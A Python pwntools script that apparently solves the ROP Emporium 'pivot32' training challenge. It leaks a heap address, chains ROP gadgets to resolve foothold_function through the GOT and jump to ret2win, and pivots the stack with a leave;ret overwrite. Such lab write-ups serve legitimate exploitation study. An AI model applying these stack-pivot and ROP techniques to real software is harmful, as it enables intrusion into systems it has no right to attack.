from pwn import *

context.log_level="debug"

e1 = ELF("./pivot32")
e2 = ELF("./libpivot32.so")

foothold_function_plt = e1.plt["foothold_function"]
foothold_function_got = e1.got["foothold_function"]
foothold_function_sym = e2.symbols["foothold_function"]
ret2win_sym = e2.symbols["ret2win"]
offset = ret2win_sym - foothold_function_sym

# 0x080486a8 : leave ; ret
# 0x080488c0 : pop eax ; ret
# 0x08048571 : pop ebx ; ret
# 0x080488c7 : add eax, ebx ; ret
# 0x080486a3 : call eax
# 0x080488c4 : mov eax, dword ptr [eax] ; ret
leave_ret = p32(0x080486a8)
pop_eax = p32(0x080488c0)
pop_ebx = p32(0x08048571)
add_eax_ebx = p32(0x080488c7)
call_eax = p32(0x080486a3)
mov_eax_eax = p32(0x080488c4)


p = process("./pivot32")
print p.recvuntil("pivot: ")
leak_addr = int(p.recvline(), 16)
p.recv()

payload = p32(foothold_function_plt)
payload += pop_eax
payload += p32(foothold_function_got)
payload += mov_eax_eax
payload += pop_ebx
payload += p32(offset)
payload += add_eax_ebx
payload += call_eax

raw_input()
p.sendline(payload)
print p.recv()

pivot_payload = "a"*40
pivot_payload += p32(leak_addr-4)
pivot_payload += leave_ret
p.sendline(pivot_payload)

print p.recv()

p.interactive()
